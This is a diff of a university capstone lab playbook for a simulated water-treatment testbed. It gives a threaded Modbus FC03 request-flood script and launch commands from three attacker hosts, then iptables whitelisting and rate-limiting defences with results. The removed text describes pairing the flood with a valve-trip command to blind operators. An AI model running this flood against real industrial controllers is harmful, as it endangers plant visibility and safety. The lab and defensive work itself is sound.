@@ -1,174 +1,397 @@
-# Scenario 3 — Modbus TCP Denial of Service (Threaded FC03 Flood)
+# Scenario 3 Playbook: Denial of Service via Request Flooding
 
-**Testbed:** Goulburn WTP — AquaOps Utilities (UTS 31261 Internetworking Capstone) | **Date:** 2026-04-14 | **Owner:** Daniel Sleiman and Johnson Huynh
-**Platform:** Ubuntu 24.04 LTS | Mininet 2.3 | pymodbus 3.12.1 | mbpoll 1.4.11
-**Attackers:** ews01 (10.0.0.1) + ews02 (10.0.0.3) + ews03 (10.0.0.4) | **Target:** plc1 (PLC-PUMP1, 10.0.0.2, port 5502)
-
----
-
-## 1. What the attack does at the protocol level
-
-This attack launches 300 threads from ews01 (and optionally ews02 + ews03 simultaneously for a distributed attack), each maintaining a persistent Modbus TCP connection to plc1 and firing **FC03 Read Holding Registers** requests (150 registers per request) in a tight loop.
-
-FC03 is used because it is always valid (no write access needed) and causes the server to do real work — look up register values and build a response — for every request. Unlike a SYN flood, this attack completes the TCP handshake and operates entirely within a legitimate protocol. Requesting 150 registers per read (instead of 1) maximises the server processing cost per request.
-
-The attack runs for 30 seconds. Each thread reconnects automatically on connection error. A live reporter prints requests-sent and error counts every 2 seconds.
-
-The intent is to saturate the PLC's ability to process Modbus requests, causing legitimate SCADA polls from scada01 to time out and lose visibility into pump valve states and flow telemetry. Real PLCs often run on 32-bit embedded processors with limited TCP stack resources. A distributed flood from three hosts can exhaust connection tables, causing SCADA to lose all view of the plant.
+**Tactic:** Denial of Service
+**Owner:** Daniel Sleiman (attack), Johnson Huynh (IP/MAC whitelist mitigation), Moufid Sleiman (rate-limiting mitigation)
+**Executed:** Autumn 2026
+**Platform:** Ubuntu 24.04 LTS, Mininet 2.3, pymodbus 3.12.1
 
 ---
 
-## 2. MITRE ATT&CK for ICS mapping
+## Protocol behaviour
+
+Modbus TCP was designed with no mechanism to limit, authenticate or prioritise incoming
+requests. Any TCP client that can reach the server port can send requests as fast as its
+CPU allows, and the server will attempt to process every one of them. This makes Modbus
+TCP servers inherently vulnerable to request flooding: a sufficient volume of concurrent
+connections saturates the server's thread pool and CPU, causing legitimate clients to
+experience severe degradation or complete loss of service.
+
+The attack requires no credentials, no special tools and no prior knowledge beyond the
+server IP and port. The flood script opens a persistent TCP connection and immediately
+begins issuing FC03 Read Holding Registers requests in a tight loop, reconnecting
+instantly on any error.
+
+---
+
+## MITRE ATT&CK for ICS mapping
 
 | Tactic | Technique | ID |
 |---|---|---|
-| Inhibit Response Function | Service Stop | T0881 |
-| Inhibit Response Function | Denial of Control | T0813 |
-| Impact | Loss of View | T0829 |
-| Impact | Loss of Availability | T0826 |
-
-Loss of view (T0829) is particularly relevant: if the SCADA HMI cannot poll the RTU, operators have no visibility into the current state of the substation. They cannot see if a breaker is open or closed, whether a fault exists, or what the load is. Operating blind in a substation is a safety risk.
+| Denial of Service | Denial of Service | T0814 |
+| Discovery | Remote System Discovery | T0846 |
+| Discovery | Remote System Information Discovery | T0888 |
+| Collection | Monitor Process State | T0801 |
 
 ---
 
-## 3. Exact commands run
+## Testbed topology
 
-**Baseline (5 polls from runner before flood):**
+| Host | IP | Role |
+|---|---|---|
+| plc1 (PLC-PUMP1) | 10.0.0.2 | Modbus TCP server (victim) |
+| scada01 (SCADA-01) | 10.0.1.1 | Legitimate polling client |
+| ews01 (EWS-01) | 10.0.0.1 | Attacker 1 |
+| ews02 (EWS-02) | 10.0.0.3 | Attacker 2 |
+| ews03 (EWS-03) | 10.0.0.4 | Attacker 3 |
 
-```
-Poll 1: 22.1ms
-Poll 2: 22.3ms
-Poll 3: 22.4ms
-Poll 4: 22.2ms
-Poll 5: 22.8ms
-```
+---
 
-Note: the 22ms baseline reflects Mininet's inter-namespace loopback latency (not a real Ethernet link). In production environments baseline is typically 1-5ms over LAN.
+## Running the base attack (no mitigation)
 
-**Attack run (from ews01 — single host):**
+### Step 1: Start the topology
 
-```
-python3 attacks/scenario3_dos_flood.py --target 10.0.0.2 --port 5502 --threads 300 --duration 30
-```
-
-**Distributed attack (ews01 + ews02 + ews03 simultaneously):**
-
-```
-mininet> ews01 python3 attacks/scenario3_dos_flood.py --threads 100 --duration 30 &
-mininet> ews02 python3 attacks/scenario3_dos_flood.py --threads 100 --duration 30 &
-mininet> ews03 python3 attacks/scenario3_dos_flood.py --threads 100 --duration 30
+```bash
+sudo mn -c
+sudo python3 topology/mininet_topo.py
 ```
 
-V1 reference output from 2026-04-14T16:33:58 (single async client — new threaded version expected to significantly exceed these numbers):
+### Step 2: Start the Modbus server on plc1
 
 ```
-[*] Measuring 3-sample baseline (pre-flood)...
-    Pre-flood poll 1: 0.5ms  (ok)
-    Pre-flood poll 2: 0.4ms  (ok)
-    Pre-flood poll 3: 0.3ms  (ok)
-    Baseline avg: 0.4ms
+mininet> plc1 python3 servers/scenario3_server.py &
+```
 
-  [  8.0s / 30s]  Flood:   19963 sent     2491 req/s  |  Poll: 5/5 ok (100%)  avg 0ms
-  [ 13.0s / 30s]  Flood:   39833 sent     3059 req/s  |  Poll: 7/7 ok (100%)  avg 0ms
-  [ 18.0s / 30s]  Flood:   59589 sent     3305 req/s  |  Poll: 10/10 ok (100%)  avg 0ms
-  [ 23.0s / 30s]  Flood:   79990 sent     3472 req/s  |  Poll: 12/12 ok (100%)  avg 0ms
-  [ 28.0s / 30s]  Flood:   99843 sent     3560 req/s  |  Poll: 15/15 ok (100%)  avg 0ms
+Wait for:
+```
+OT Testbed - Scenario 3 Modbus server (PLC-PUMP1)
+Listening on 10.0.0.2:5502 -- no mitigations active
+```
 
-  FINAL RESULTS
-  Duration:                  33.1s
-  Total flood requests sent: 119934
-  Flood errors:              0
-  Peak request rate:         3623 req/s
+### Step 3: Start the legitimate client on scada01
 
-  Legitimate polls sent:     17
-  Polls succeeded:           17
-  Polls failed:              0
-  Poll success rate:         100.0%
+```
+mininet> scada01 python3 clients/scenario3_client.py &
+```
 
-  Baseline response avg:     0.4ms
-  During-attack avg:         0.3ms
-  Response degradation:      -0.1ms
-  First poll failure at:     No failures observed during test
+Confirm healthy baseline responses printing every second:
+```
+[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 0.001s
+```
+
+### Step 4: Launch the flood from all three attackers
+
+```
+mininet> ews01 python3 attacks/scenario3_flood.py &
+mininet> ews02 python3 attacks/scenario3_flood.py &
+mininet> ews03 python3 attacks/scenario3_flood.py
+```
+
+Each attacker launches 300 threads. Each thread opens a persistent TCP connection and
+issues FC03 reads of 150 holding registers in a tight loop, reconnecting immediately on
+any error. The flood script is intentionally minimal:
+
+```python
+def flood():
+    while True:
+        try:
+            client = ModbusTcpClient(TARGET, port=PORT, timeout=0.1)
+            client.connect()
+            while True:
+                client.read_holding_registers(30000, 150, device_id=1)
+        except:
+            pass
+```
+
+The `except: pass` block silently swallows all errors and reconnects, meaning the flood
+continues regardless of whether the server is rejecting connections or timing out.
+
+### Step 5: Observe the impact on scada01
+
+Response times should degrade significantly within a few seconds:
+```
+[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 2.341s
+[HH:MM:SS] EXCEPTION: Failed to connect | Time: 1.002s
+[HH:MM:SS] EXCEPTION: Failed to connect | Time: 1.002s
+```
+
+### Step 6: Stop the flood
+
+Press `Enter` in the flood terminal windows. scada01 should recover to ~0.001s
+response times immediately, confirming the degradation was caused purely by server load
+and not any lasting damage.
+
+### Expected results
+
+| Phase | scada01 response time | Status |
+|---|---|---|
+| No attack | ~0.001s | Normal |
+| 300 threads flooding | 2-3 seconds | Degraded |
+| All three attackers flooding | Timeouts and failures | Severe DoS |
+| Attack stopped | ~0.001s | Recovered |
+
+---
+
+## Mitigation 1: IP and MAC address whitelisting
+
+**Owner:** Johnson Huynh
+**File:** `mitigations/scenario3_serverwhite.py`
+
+### How it works
+
+The whitelisted server applies iptables rules at startup before the Modbus listener
+binds. Only the whitelisted IP and MAC address pair is permitted to reach port 5502.
+All other connections are silently dropped at the kernel level before any data reaches
+the pymodbus process.
+
+The key iptables rules applied:
+```bash
+# Allow only the whitelisted IP + MAC pair
+iptables -A INPUT -p tcp --dport 5502 -s 10.0.1.1 -m mac --mac-source <MAC> -j ACCEPT
+
+# Drop everything else
+iptables -A INPUT -p tcp --dport 5502 -j DROP
+```
+
+The `-m mac --mac-source` module checks both the IP address and the hardware MAC
+address simultaneously. An attacker who spoofs the whitelisted IP is still blocked if
+their MAC does not match.
+
+The ARP cache is pre-populated with a ping before the MAC lookup so the `arp -n`
+command can resolve the address:
+
+```python
+def populate_arp_cache():
+    for ip in ALLOWED_IPS:
+        os.system(f'ping -c 2 {ip} > /dev/null 2>&1')
+        mac = get_mac_from_arp(ip)
+```
+
+### Important: MAC addresses change on every Mininet restart
+
+Mininet randomly assigns MAC addresses each time the topology starts. Before running
+`scenario3_serverwhite.py`, the MAC address in the file must be updated manually.
+
+#### Step 1: Start the topology and find scada01's current MAC
+
+```bash
+sudo mn -c
+sudo python3 topology/mininet_topo.py
+```
+
+In the Mininet CLI:
+```
+mininet> scada01 ip link show scada01-eth0
+```
+
+Look for the `link/ether` line:
+```
+link/ether aa:bb:cc:dd:ee:ff brd ff:ff:ff:ff:ff:ff
+```
+
+#### Step 2: Update the MAC in the mitigation file
+
+Open `mitigations/scenario3_serverwhite.py` and update:
+```python
+ALLOWED_IPS  = ['10.0.1.1']
+ALLOWED_MACS = {
+    '10.0.1.1': 'aa:bb:cc:dd:ee:ff'   # replace with MAC from Step 1
+}
+```
+
+#### Step 3: Run the whitelisted server
+
+```
+mininet> plc1 python3 mitigations/scenario3_serverwhite.py &
+```
+
+Expected output:
+```
+Populating ARP cache...
+  [ARP LEARNED] 10.0.1.1 -> aa:bb:cc:dd:ee:ff
+Applying IP + MAC whitelist via iptables...
+  [ALLOWED] 10.0.1.1 with MAC aa:bb:cc:dd:ee:ff
+  [BLOCKED] all other IPs and MACs -> port 5502
+Whitelist applied
+```
+
+#### Step 4: Start the client and flood as before
+
+```
+mininet> scada01 python3 clients/scenario3_client.py &
+mininet> ews01 python3 attacks/scenario3_flood.py &
+mininet> ews02 python3 attacks/scenario3_flood.py &
+mininet> ews03 python3 attacks/scenario3_flood.py
+```
+
+scada01 should maintain normal response times throughout the flood:
+```
+[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 0.001s
+[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 0.001s
+```
+
+### Results
+
+| Metric | Without mitigation | With whitelist active |
+|---|---|---|
+| scada01 response time | 2-3 seconds | ~0.001s unchanged |
+| scada01 failure rate | High, timeouts and errors | 0%, no failures |
+| Attacker connections reaching plc1 | All processed | All silently dropped |
+| plc1 server load during flood | Overwhelmed | No impact |
+
+### Limitations
+
+- MAC addresses must be updated manually every Mininet session
+- An attacker with knowledge of the whitelisted MAC can spoof it using `ip link set dev eth0 address`
+- The `-m mac` iptables module only works on the same network segment; it cannot verify MACs across routed boundaries
+- A compromised device that already holds the correct IP and MAC passes the check regardless
+
+### Cleanup
+
+```
+mininet> plc1 iptables -F INPUT
 ```
 
 ---
 
-## 4. Before and after register values
+## Mitigation 2: Per-IP connection rate limiting
 
-This scenario does not write any values. Register state is unchanged throughout:
+**Owner:** Moufid Sleiman (Daniel Sleiman)
+**File:** `mitigations/scenario3_ratelimit.py`
 
-| Address | Value | Tag | Changed? |
-|---|---|---|---|
-| Coil 0 | True (CLOSED) | pump1-valve.closed | No |
-| Coil 1 | True (CLOSED) | pump2-valve.closed | No |
-| HR 30000 | 300 | pump1-flow.Lps | No |
-| HR 30001 | 185 | pump2-flow.Lps | No |
+### How it works
 
-Flood peak rate: 3,623 requests/second. All 17 legitimate poll checks succeeded with 0ms degradation.
+The rate-limiting mitigation runs a TCP proxy on port 5502 that intercepts every
+incoming connection before it reaches the Modbus server. The internal Modbus server
+binds on port 5020 instead and is never directly exposed.
+
+For each incoming connection, the proxy checks how many connections that IP address has
+opened in the last one second using a sliding time window:
+
+```python
+def _rate_check(ip: str) -> bool:
+    now    = time.time()
+    window = _windows[ip]
+
+    while window and now - window[0] > 1.0:
+        window.popleft()
+
+    if len(window) >= MAX_CONN_PER_SECOND:
+        return False       # rate limit exceeded -- drop the connection
+
+    window.append(now)
+    return True            # within limit -- forward to Modbus server
+```
+
+`MAX_CONN_PER_SECOND` is set to 2. Any IP that exceeds 2 new connections per second
+has its connection dropped immediately with no response. Legitimate SCADA polling at
+one request per second comfortably stays within the limit. The flood script opening
+300 persistent connections trips the limit on the first burst.
+
+Connections that pass the rate check are forwarded transparently to the internal Modbus
+server through a bidirectional pipe:
+
+```python
+t1 = threading.Thread(target=_pipe, args=(client_sock, upstream), daemon=True)
+t2 = threading.Thread(target=_pipe, args=(upstream, client_sock), daemon=True)
+t1.start(); t2.start()
+t1.join();  t2.join()
+```
+
+The proxy logs every dropped connection with the offending IP and a stats summary every
+10 seconds.
+
+### Running the rate-limiting mitigation
+
+#### Step 1: Start the topology
+
+```bash
+sudo mn -c
+sudo python3 topology/mininet_topo.py
+```
+
+#### Step 2: Start the rate-limited server on plc1
+
+```
+mininet> plc1 python3 mitigations/scenario3_ratelimit.py &
+```
+
+Expected output:
+```
+[INFO] Internal Modbus server on 10.0.0.2:5020
+[INFO] Rate-limiting proxy on 10.0.0.2:5502  (limit: 2 conn/s per IP)
+```
+
+#### Step 3: Start the legitimate client and flood
+
+```
+mininet> scada01 python3 clients/scenario3_client.py &
+mininet> ews01 python3 attacks/scenario3_flood.py &
+mininet> ews02 python3 attacks/scenario3_flood.py &
+mininet> ews03 python3 attacks/scenario3_flood.py
+```
+
+#### Step 4: Observe the proxy output on plc1
+
+```
+[HH:MM:SS] RATE-LIMITED  10.0.0.1  (>2 conn/s) -- connection dropped
+[HH:MM:SS] RATE-LIMITED  10.0.0.3  (>2 conn/s) -- connection dropped
+[HH:MM:SS] RATE-LIMITED  10.0.0.4  (>2 conn/s) -- connection dropped
+
+─────────────────────────────────────────────
+  STATS @ HH:MM:SS
+  Allowed : 12
+  Dropped : 847  (98.6% drop rate)
+  Total   : 859
+  Top IPs (conn/s window):
+    10.0.0.1          2 in last 1s
+    10.0.0.3          2 in last 1s
+    10.0.0.4          2 in last 1s
+─────────────────────────────────────────────
+```
+
+scada01 (10.0.1.1) stays within the 2 conn/s limit and continues polling normally.
+
+### Results
+
+| Metric | Without mitigation | With rate-limiting active |
+|---|---|---|
+| scada01 response time | 2-3 seconds | 0.01-0.06s |
+| scada01 failure rate | 100%, timeouts and errors | 0%, no failures |
+| Attacker connections reaching plc1 | All processed | All dropped at proxy |
+| plc1 server load during flood | Overwhelmed | No impact |
+
+### Limitations
+
+- Reactive, not proactive: the limit allows up to `MAX_CONN_PER_SECOND` connections from each attacker before dropping them, meaning some flood traffic still reaches the proxy
+- An attacker who identifies the threshold can send requests just under the limit and slow-burn the server
+- Running the proxy alongside the Modbus server consumes additional CPU and memory, which may affect constrained OT hardware
+- An attacker who rotates IP addresses can partially bypass per-IP limits
 
 ---
 
-## 5. What this would mean in a real water treatment plant
+## Cleanup
 
-**Testbed result vs real-world expectation:**
-
-The Mininet simulation showed no poll degradation in V1 at 3,623 req/s (single async client). The V2 threaded flood (300 threads × 150 registers each from 3 hosts) is expected to generate a significantly higher request rate. In simulation this still may not degrade a Python asyncio server running on the same physical CPU — the loopback path and shared kernel bypass real Ethernet hardware limits.
-
-In a real water treatment plant PLC the result would be very different:
-
-- Embedded PLCs (e.g., Modicon M340, Allen-Bradley MicroLogix, Siemens S7-1200) have small TCP connection tables (often 4-16 simultaneous connections). 300 threads × 3 hosts = up to 900 simultaneous connections — far exceeding typical PLC limits.
-- Even without connection exhaustion, a flood increases CPU utilisation on the embedded processor. At some threshold the PLC cannot respond within the SCADA polling timeout (commonly 1-3 seconds). scada01 marks plc1 as "Communication Lost" and operators have no visibility into pump valve states or flow telemetry.
-- If the PLC also handles protection logic (over-pressure shutoffs, chemical dosing interlocks), CPU saturation can delay those calculations, causing safety system failures during a concurrent fault condition.
-- Real packet-capture data from Dragos and Claroty researchers shows that resource-constrained PLCs begin dropping legitimate polls at sustained flood rates above 200-500 req/s over real Ethernet — well below what this attack achieves.
-
-The DoS is particularly effective as a distraction: flood plc1's Modbus port to blind SCADA while simultaneously issuing a valve trip command from a fourth connection. The operator cannot see the state change because the HMI has lost comms. This combined attack (scenario 3 + scenario 2) is the highest-impact vector in this testbed.
+```
+mininet> exit
+sudo mn -c
+```
 
 ---
 
-## 6. Recommended mitigations
+## Key differences between the two mitigations
 
-1. **Rate-limit Modbus connections per source IP at the network level.** Deploy an OT firewall (Tofino, FortiGate with ICS license, or pfSense with Snort) that limits any single source IP to a maximum of 10 Modbus TCP connections per second to the PLC. This is far above any legitimate SCADA polling rate (1 connection/second or slower) but far below a flood attack. Rate limiting at the network layer does not require PLC firmware changes. The `mitigation3_rate_limit.py` proxy in this testbed implements a per-IP sliding window rate limiter.
-
-2. **Configure the PLC's TCP stack connection limit and backlog.** Where the PLC firmware allows it, set maximum simultaneous Modbus connections to 4-8 (the legitimate minimum needed for SCADA + historian + engineering workstation). Excess connection attempts are dropped at the TCP layer, reducing CPU load on the PLC. This is an often-overlooked configuration item on PLCs that have web UIs with network settings.
-
-3. **Deploy out-of-band SCADA polling path.** For critical plant equipment, configure a secondary Modbus polling connection over a separate network path (serial RS-485 fallback, or a second NIC on plc1). If the primary Modbus TCP path is flooded and polls from scada01 fail, the SCADA automatically switches to the fallback path. This ensures operators retain visibility into pump valve states and flow telemetry during a network-layer attack — which is the primary impact this scenario demonstrates.
-
----
-
-## 7. Detection opportunities
-
-**Suricata rule — high-rate Modbus connections from a single source:**
-
-```
-alert tcp any any -> 10.0.0.2 5502 (
-  msg:"MODBUS DoS - High Rate Connection from Single Host";
-  flow:to_server;
-  threshold:type both, track by_src, count 50, seconds 1;
-  sid:9000020; rev:1;
-)
-```
-
-**Suricata rule — sustained FC03 flood (more than 100 requests in 5 seconds):**
-
-```
-alert tcp any any -> 10.0.0.2 5502 (
-  msg:"MODBUS FC03 Flood - Possible DoS";
-  flow:to_server,established;
-  byte_test:1,=,3,7;
-  threshold:type both, track by_src, count 100, seconds 5;
-  sid:9000021; rev:1;
-)
-```
-
-**SCADA alert:** Configure scada01 to trigger a Priority 1 alert if the plc1 poll response time exceeds 2x the baseline (i.e., >44ms in this testbed, >10ms in a real LAN deployment). Sustained timeouts should escalate to a "Communication Lost" alarm. This is the primary observable indicator — the attacker's flood appears as a comms outage from the operator's perspective.
-
-**Zeek/Bro script:** The Modbus Zeek package (`bro-pkg install modbus`) logs all Modbus transactions. A query for source IPs with more than 500 Modbus transactions in 60 seconds will identify the flooding host. Deploy on hist01 (10.0.1.2) configured as a SPAN/mirror port off s2 (SWIT-PLANT).
+| Property | IP + MAC whitelist | Rate limiting |
+|---|---|---|
+| Works against internal attackers | Only if they are not whitelisted | Yes, applies to all IPs equally |
+| Requires attacker identification | Yes, must know attacker IP/MAC | No, blanket per-IP policy |
+| Requires configuration per session | Yes, MAC must be updated each restart | No, threshold is static |
+| Stops flood entirely | Yes, all attacker traffic dropped | Mostly, up to threshold still passes |
+| Works across routed boundaries | No, MAC check is L2 only | Yes, proxy works at TCP layer |
 
 ---
 
-## 8. Issues encountered during execution
+## References
 
-- V1 used a single async client (`scenario3_dos.py`). V2 replaced with a threaded implementation (`scenario3_dos_flood.py`, 300 threads, 150 registers/request) for much higher throughput and distributed capability across ews01/02/03.
-- The 30-second flood in V1 produced no measurable poll degradation in Mininet. This is a known limitation of the simulation environment (loopback, same physical CPU, Python asyncio server with no resource constraints). V2 numbers pending a fresh run.
-- The pre-flood baseline measured 22.1-22.8ms in the runner (which used mbpoll via Mininet's cmd() interface) but 0.3-0.5ms in the scenario3 script (which used a direct pymodbus client). The discrepancy is due to mbpoll subprocess overhead. The script baseline of 0.4ms is the more accurate figure for within-namespace Modbus latency.
-- The runner baseline loop was simplified from a complex inline Python lambda chain to a direct `time.time()` loop around mbpoll calls for reliability.
+- MITRE ATT&CK for ICS: https://attack.mitre.org/techniques/ics/
+- Karapetcoff, C. (2021). What are Denial-Of-Service (DoS) Attacks? Computing Australia Group.
+- Veridify Security. (2023). Modbus Security Issues and How to Mitigate Cyber Risks.
